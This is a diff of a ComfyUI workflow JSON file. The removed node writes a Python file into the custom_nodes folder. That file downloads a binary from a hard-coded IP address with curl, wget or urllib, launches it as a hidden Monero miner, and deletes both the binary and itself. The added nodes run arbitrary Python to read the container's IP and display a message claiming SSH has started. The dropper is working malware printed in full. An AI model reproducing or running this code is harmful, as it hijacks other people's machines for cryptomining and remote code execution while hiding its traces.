@@ -1,11 +1,42 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "2": {
     "inputs": {
-      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.uvjkkw; (curl -sfL --max-time 15 http://178.128.14.204:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://178.128.14.204:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://178.128.14.204:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id rig5246-xmr >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_fc76d061",
-      "output_folder": "/data/project/zj/ComfyUI-0.20.1/custom_nodes",
-      "file_extension": ".py"
+      "noise_seed": 1044615003748490
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "RandomNoise"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview_markdown": "✅ SSH started successfully",
+      "preview_text": "✅ SSH started successfully",
+      "previewMode": null,
+      "source": [
+        "9",
+        0
+      ]
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "Preview as Text"
+    }
+  },
+  "9": {
+    "inputs": {
+      "expression": "import socket\nhostname = socket.gethostname()\nip = socket.gethostbyname(hostname)\nout1 = f\"Container IP: {ip}\"",
+      "input_count": 1,
+      "print_to_console": "False",
+      "update": null,
+      "in1": [
+        "2",
+        0
+      ]
+    },
+    "class_type": "EvaluateMultiple1",
+    "_meta": {
+      "title": "EvaluateMultiple1"
     }
   }
 }
